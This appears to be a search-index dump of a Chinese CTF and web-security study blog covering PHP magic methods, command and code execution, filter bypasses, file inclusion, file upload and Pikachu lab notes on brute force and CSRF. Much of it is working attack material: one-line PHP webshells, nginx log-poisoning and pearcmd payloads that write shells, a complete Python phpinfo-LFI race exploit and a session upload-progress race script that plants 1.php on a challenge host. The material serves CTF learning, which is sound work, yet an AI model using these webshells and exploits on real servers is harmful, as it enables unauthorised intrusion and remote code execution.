默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#php魔术方法"},{"categories":["web","notes"],"content":"一点php基础知识 ","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#"},{"categories":["web","notes"],"content":"\r一.PHP基础","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#一php基础"},{"categories":["web","notes"],"content":"\r0x1 PHP基本概念即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。 ","date":"2023-11-17","objectID":"/php/:1:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-php基本概念"},{"categories":["web","notes"],"content":"\r0x2 PHP环境phpstudy ","date":"2023-11-17","objectID":"/php/:2:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-php环境"},{"categories":["web","notes"],"content":"\r0x3PHP基础语法基础语法：函数名（函数参数）分号 函数可以有0个或多个函数，无函数就不写 有系统自带函数，用户也可以自定义函数 用?来区分文件和参数部分 参数部分用\u0026区分多个键值对 单个键值对用=分割出 键和值 echo 是一个语言结构，不是一个函数 \u003c?php echo \"hello world\"; ?\u003e $_GET \u003c?php $a=$_GET['a']; echo $a; ?\u003e $_POST \u003c?php $a=$_POST['a']; echo $a; ?\u003e 自定义函数 \u003c?php function add($a,$b) { return $a+$b; } $a=$_POST['a']; $b=$_POST['b']; $c=add($a,$b); echo $c; ?\u003e 危险函数 \u003c?php $cmd=$_POST['cmd']; system($cmd); ?\u003e ","date":"2023-11-17","objectID":"/php/:3:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3php基础语法"},{"categories":["web","notes"],"content":"\r0x4 PHP的命令执行命令执行一般指目标服务器上的命令执行，也就是远程命令执行。 英文缩写为RCE ◎Remote Command Exec ◎Remote Code Exec 默认讨论的服务器系统为Linux shell的分号**；来拆分命令，与\u0026\u0026**(url编码为%26%26，也可以分隔命令)的区别是： **\u0026\u0026需要前面命令执行成功后后面的命令才会执行(短路)，；**则不管成功与否，两个命令作为两行命令来执行 ||也表示或，但不短路 ","date":"2023-11-17","objectID":"/php/:4:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4-php的命令执行"},{"categories":["web","notes"],"content":"\rPHP的Command Exec函数官方中有6种函数可执行系统命令 ◎system ◎passthru ◎exec ◎shell_exec ◎popen ◎pcntl_exec ","date":"2023-11-17","objectID":"/php/:4:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#php的command-exec函数"},{"categories":["web","notes"],"content":"\r0x5 过滤与绕过","date":"2023-11-17","objectID":"/php/:5:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5-过滤与绕过"},{"categories":["web","notes"],"content":"\r◎黑名单过滤的绕过替换过滤，双写绕过 通配符*指代任意长度的字符 ？表示占位符，只指一个字符 error_reporting(0); //隐藏报错 highlight_file(_FILE_); //高亮显示源码 当我们遇到过滤flag关键字的时候，我们可以用通配符绕过 如果遇到过滤读取文件命令的情况，我们可以替换使用不熟悉但有类似作用的命令 在Linux环境中，反引号 ’ ‘ 表示执行 如果所有读取文件命令都被过滤，可以通过组合的形式来执行，例如： ls 'echo /bin' 等效于 ls /bin 甚至可以 （构造复合语法，通过base64编码等方法） 如果base64和echo也被过滤，可以通过变量拼接来绕过关键字 例如 ","date":"2023-11-17","objectID":"/php/:5:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#黑名单过滤的绕过"},{"categories":["web","notes"],"content":"\r◎符号过滤1.过滤空格的情况 (1)读取文件时，使用\u003c\u003e代替空格 (2)使用${IFS}代替空格，也可以使用$IFS$9代替空格，bash下甚至可以使用{cmd,args}代替空格 (3)控制字符代替空格%09 %0b %0c (4)字符串截取空格 (5)当然也可以通过burp来爆破一下可用字符表示空格 ","date":"2023-11-17","objectID":"/php/:5:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#符号过滤"},{"categories":["web","notes"],"content":"\r◎不回显能把不回显的数据传输出来让我们看到所用到的数据传输路径，叫做通道 认识一个危险函数：shell_exec 和system函数的区别：shell_exec并不把执行结果输出到当前页面，而是作为字符串返回，如果页面没有事输出这个字符串，我们则看不到结果。 (1)写入文件、二次返回(基于文件的数据带出) 无法直接看到信息，将信息写入文件，在通过读取文件进行信息获得 比如写入1.txt，再访问url+1.txt就可实现数据传回 在shell中，我们可以使用\u003e符号来写文件 (2)DNS通道 如果当前目录不可写入,可通过DNS解析记录将数据传回 http://www.dnslog.cn/ ","date":"2023-11-17","objectID":"/php/:5:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#不回显"},{"categories":["web","notes"],"content":"\r0x6 PHP文件上传机制\r","date":"2023-11-17","objectID":"/php/:6:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x6-php文件上传机制"},{"categories":["web","notes"],"content":"\r[php弱类型比较]php弱类型比较中，数字和字符串比较中，字符串转换成数字的过程中，会取字符串前面数字的值作为整个字符串转换成数字的值，比较“1admin”,转换成数字就是1，所以\"admin1\"的话，因为字符串没有数字，只能转换成0了，所以第一个才会是true。 而最后一个则是被php当成科学计数法的，计算，所以结果都是0，比较时会相等。 0x03: md5碰撞和strcmp函数绕过，可以看我的另外一篇博客。 0x04: is_numeric()函数会判断如果是数字和数字字符串的话，会返回true,否则返回false; ","date":"2023-11-17","objectID":"/php/:6:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#php弱类型比较"},{"categories":["web","notes"],"content":"\r二.PHP代码执行","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#二php代码执行"},{"categories":["web","notes"],"content":"\r0x1 什么是PHP代码执行可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行 eval(\"要执行的PHP代码\"); ","date":"2023-11-17","objectID":"/php/:1:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-什么是php代码执行"},{"categories":["web","notes"],"content":"\r0x2 代码执行和命令执行的区别执行参数不同 代码执行的是PHP后者其他语言的代码，比如phpinfo() 而命令执行，一般执行的是shell命令，比如ls / system 命令执行 shell_exec 命令执行 eval 代码执行 ","date":"2023-11-17","objectID":"/php/:2:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-代码执行和命令执行的区别"},{"categories":["web","notes"],"content":"\r0x3 PHP代码执行的格式在PHP语言中，代码分为三种 ","date":"2023-11-17","objectID":"/php/:3:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3-php代码执行的格式"},{"categories":["web","notes"],"content":"\r1.函数调用函数特征：函数名字，函数参数，返回值 基本的语法： 函数名 （ 参数 ）； error_reporting ( 0 ) ; ","date":"2023-11-17","objectID":"/php/:3:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#1函数调用"},{"categories":["web","notes"],"content":"\r2.类方法调用类的特征：类实例，方法名，方法参数，返回值 ？？？动态函数调用 ？？？静态函数调用 ","date":"2023-11-17","objectID":"/php/:3:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#2类方法调用"},{"categories":["web","notes"],"content":"\r3.语言结构调用 echo \" ctfshow \" ; ","date":"2023-11-17","objectID":"/php/:3:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#3语言结构调用"},{"categories":["web","notes"],"content":"\r0x4 PHP代码执行后门 \u003c?php eval($_POST[1]); ?\u003e 最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可： 1=system(\"calc\"); ——\u003e蚁剑 url地址：xxxxx 连接密码：1 若木马接收代码为eval($_GET[1]); 我们需要手动写一个转接头，加在GET型请求的url后面： （GET转POST转接头） ?1=eval(\\$_POST[1]); ","date":"2023-11-17","objectID":"/php/:4:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4-php代码执行后门"},{"categories":["web","notes"],"content":"\r0x5 代码执行的类型函数名+函数类型可控=可以执行任意代码 1.危险函数型 (\"sys\".\"tem\")=system \u003cscript language=\"php\"\u003eeval($_POST[1])\u003c/script\u003e php5.6版本以前的可用 最短木马： \u003c?`$_GET[2]`;\u00262= ","date":"2023-11-17","objectID":"/php/:5:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5-代码执行的类型"},{"categories":["web","notes"],"content":"\r三.PHP文件包含该笔记借鉴了CSDN博主「ing_end」的原创文章， 原文链接：https://blog.csdn.net/ing_end/article/details/123886703 ","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#三php文件包含"},{"categories":["web","notes"],"content":"\r0x1何为包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数 的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。 ","date":"2023-11-17","objectID":"/php/:0:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1何为包含"},{"categories":["web","notes"],"content":"\r0x2文件包含漏洞的产生：程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。 文件上传JEG PNG JPEG GlF先上传PNG图片马，然后再包含。 ","date":"2023-11-17","objectID":"/php/:0:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2文件包含漏洞的产生"},{"categories":["web","notes"],"content":"\r0x3文件包含语句：include( ) 文件包含失败时，会产生警告，脚本会继续运行。 include_once() 与include()功能相同，文件只会被包含一次。 require( ) 文件包含失败时，会产生错误，直接结束脚本执行。 require_once( ) 与require( )功能相同，文件只会被包含一次。 ","date":"2023-11-17","objectID":"/php/:0:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3文件包含语句"},{"categories":["web","notes"],"content":"\r0x4相关配置：一般来讲，文件包含有本机文件包含和远程文件包含之分： 本地文件包含就是可以读取和打开本地文件 远程文件包含（http，ftp，php伪协议）就是可以远程加载文件 我们可以通过php.ini来进行配置。如下： allow_url_fopen=On/Off 本地文件包含(LFI)（开和关都可包含本地文件） allow_url_include=On/Off 远程文件包含(RFI) ","date":"2023-11-17","objectID":"/php/:0:4","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4相关配置"},{"categories":["web","notes"],"content":"\r0x5伪协议：计算机中常见的协议: ◎网络层协议：IP协议、ICMP协议、ARP协议、IGMP协议 ◎应用层协议：HTTP协议、HTTPS协议、FTP协议、SSH协议、RDP协议、gopher协议、qq拉起协议、百度云盘拉起协议 PHP中的伪协议：file协议、php协议、data协议 （一下部分内容摘自charmersix www.charmersix.icu） ","date":"2023-11-17","objectID":"/php/:0:5","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5伪协议"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x6文件包含高级利用"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#文件包含可控点"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#nginx日志包含"},{"categories":["web","notes"],"content":"\r临时文件包含phpinfo(); 竞争上传，这里有个python2的脚本 #!/usr/bin/python import sys import threading import socket def setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r \u003c?php file_put_contents('/tmp/g', '\u003c?=eval($_REQUEST[1])?\u003e')?\u003e\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r Content-Type: text/plain\\r \\r %s -----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r HTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r HTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r HTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r HTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r Content-Length: %s\\r Host: %s\\r \\r %s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r User-Agent: Mozilla/4.0\\r Proxy-Connection: Keep-Alive\\r Host: %s\\r \\r \\r \"\"\" return (REQ1, TAG, LFIREQ) def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) \u003c offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =\u0026gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fn counter=0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter \u003e= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =\u0026gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256 def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) \u003c 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter \u003e= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join() if __name__==\"__main__\": main() ","date":"2023-11-17","objectID":"/php/:0:7","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#临时文件包含"},{"categories":["web","notes"],"content":"\rsession文件包含（upload_progress文件上传）有包含点，且PHP_SESSION_UPLOAD_PROGRESS不变时，可以使用此脚本 session_upload_progress最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下session.uoload_progress.enabled是为on的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。 从上面可以看到，session中一部分数据（session.uoload_progress.enabled）是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用session，session文件将会自动创建。 import requests import threading session=requests.session() sess='ctfshow' url=\"http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/\" #靶场地址 data1={ 'PHP_SESSION_UPLOAD_PROGRESS':'\u003c?php echo \"success\";file_put_contents(\"/var/www/html/1.php\",\"\u003c?php eval(\\\\$_POST[1]);?\u003e\");?\u003e' } file={ 'file':'ctfshow' } cookies={ 'PHPSESSID': sess } def write(): while True: r = session.post(url,data=data1,files=file,cookies=cookies) def read(): while True: r = session.get(url+\"?file=../../../../../../../tmp/sess_ctfshow\") if 'success' in r.text: print(\"shell 地址为：\"+url+\"1.php\") exit() threads = [threading.Thread(target=write), threading.Thread(target=read)] for t in threads: t.start() ","date":"2023-11-17","objectID":"/php/:0:8","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#session文件包含upload_progress文件上传"},{"categories":["web","notes"],"content":"\rpear文件包含pear模块下有很多php文件，可以利用其中的某个php，分析发现/usr/local/lib/php/PEAR/Command/Install.php存在可利用点 /usr/local/lib/php/pearcmd.php存在可利用点 argv注册功能开启了就可以使用这种姿势 可以通过配置文件写入一句话木马 ?file=/usr/local/lib/php/pearcmd.php\u0026aaaa+config-create+/var/www/html/\u003c?=`$_POST[1]`;?\u003e+1.php 其中aaa可以将数据弹出argv，三个➕，四个元素 ","date":"2023-11-17","objectID":"/php/:0:9","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#pear文件包含"},{"categories":["web","notes"],"content":"\r远程文件包含这里是结合了上边的日志包含，或者可以理解成远程日志包含 这里由于题目过滤了符号. 所以我们可以用http://www.ab173.com/net/ip2int.php 将IP转换成纯数字 ","date":"2023-11-17","objectID":"/php/:0:10","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#远程文件包含"},{"categories":["web","notes"],"content":"\r四.文件上传","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#四文件上传"},{"categories":["web","notes"],"content":"\r0x1 何为文件上传： 文件上传就是通过流的方式将文件写到服务器上 文件上传必须以POST提交表单 表单中需要 \u003cinput type=\"file\" name=\"upload\"\u003e 一句话木马(具体内容写在这篇文章)： \u003c?php eval($_POST['a']) ?\u003e 其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。 ","date":"2023-11-17","objectID":"/php/:0:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-何为文件上传"},{"categories":["web","notes"],"content":"\r0x2 文件上传漏洞类型\r","date":"2023-11-17","objectID":"/php/:0:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-文件上传漏洞类型"},{"categories":["web","notes"],"content":"\r0x3 实例去bugku、ctfhub刷题就好了，这里就不赘述了 ","date":"2023-11-17","objectID":"/php/:0:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3-实例"},{"categories":["web","wp"],"content":"pikachu靶场wp ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#"},{"categories":["web","wp"],"content":"\r敏感信息泄露​ 由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如： —通过访问url下的目录，可以直接列出目录下的文件列表; —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息; —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等; ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#敏感信息泄露"},{"categories":["web","wp"],"content":"\ricanseeyourABC\r​ F12，这题好没趣 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#icanseeyourabc"},{"categories":["web","wp"],"content":"\rBurte Force在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#burte-force"},{"categories":["web","wp"],"content":"\r基于表单的暴力破解burpsuite抓包发送到intruder直接开干 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于表单的暴力破解"},{"categories":["web","wp"],"content":"\r基于服务器的验证码绕过(On server)\r验证码是cookie验证，可以伪造，而且，同一个验证码可以一直发包(burpsuite中的repeater发包验证)，同样是发送到intruder开干（有些服务器后台是不刷新验证码的，所以抓到包后不要放包，这样验证码就一直有效，把包发到攻击模块直接爆破） burpsuite自带的密码字典包不是很受用，建议手动导入toop1000weak password开跑 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于服务器的验证码绕过on-server"},{"categories":["web","wp"],"content":"\r基于前端的验证码绕过(on client)这种将验证码的生成代码写在前端上是十分容易绕过的，单从网页的前端，关掉js功能就可以绕过，在burpsuite中重发包 验证码输入错误的情况下是不能抓包的，需先输入正确的验证码再抓包。然后再将数据包发送到爆破功能处，并且将验证码参数去除掉后再进行爆破 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于前端的验证码绕过on-client"},{"categories":["web","wp"],"content":"\r绕过Token暴力破解**token的作用：**简单来说就是服务器给前端发的身份证，前端向服务器发送请求时都要带上这个身份证，服务器通过这个身份证来判断是否是合法请求 抓包发送给暴力破解模块，攻击类型选择pitchfork(音叉)，需爆破的内容为密码和token。 攻击类型为音叉的时候，例如你要爆破账号和密码，你的账号字典为123,456；你的密码字典为147,258。那么你爆破的次数就为2次了，分别是(123,147),(456,258)，也就是说账号字典和密码字典是一一对应的 有效荷载payload1是对密码的爆破，payload2是对token的爆破 对payload1的配置比较常规，从弱口令里面导入即可 在有效荷载payload2的选项中进行Grep-Extract配置如下图 点击添加： 在对payload2有效荷载的配置中，将payload类型改为递归匹配，并进行如下配置 递归匹配的选项选择第一个(刚在选项中配置的，并填入第一个payload(token)) 资源池要使用单线程(没有的话，在下面添加)： 开始攻击，成功界面： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:2:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#绕过token暴力破解"},{"categories":["web","wp"],"content":"\rCross Site Request ForgeryCross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为\"one click\"攻击。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#cross-site-request-forgery"},{"categories":["web","wp"],"content":"\rCSRF(get)按F12根据提示登录账号并进入个人页面点击修改个人信息 随后开启burp并提交表单进行抓包，抓取用户点击submit提交时的连接并构造payload，如下： http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php?sex=boy\u0026phonenum=18626545453\u0026add=chain\u0026email=111\u0026submit=submit%20HTTP/1.1 当用户点击此链接时，邮箱就会被改为111 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrfget"},{"categories":["web","wp"],"content":"\rCSRF(post)在submit之前开始抓包，抓取提交表单的连接，右键单击，选中Engagement tools中的Generate CSRF POC，生成了一个CSRF的POC可用于检测页面是否存在CSRF漏洞 在CSRF PoC中的CSRF HTML栏进行修改，随后点击最下面一栏的用浏览器测试 复制该连接，当用户访问该链接时，个人信息内容便会被修改 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrfpost"},{"categories":["web","wp"],"content":"\rCSRF Token造成CSRF漏洞的主要原因是请求敏感操作的数据包容易被伪造,如果在每次请求时都增加一个随机码(Token), 在每次前端与后端进行数据交互时后台都要对这个随机码进行验证, 以此来防护CSRF攻击 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrf-token"},{"categories":["web","wp"],"content":"\rCross Site ScriptingCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写\"CSS\"冲突，故又称XSS。一般XSS可以分为如下几种常见类型： 1.反射性XSS; 2.存储型XSS; ​ 3.DOM型XSS; 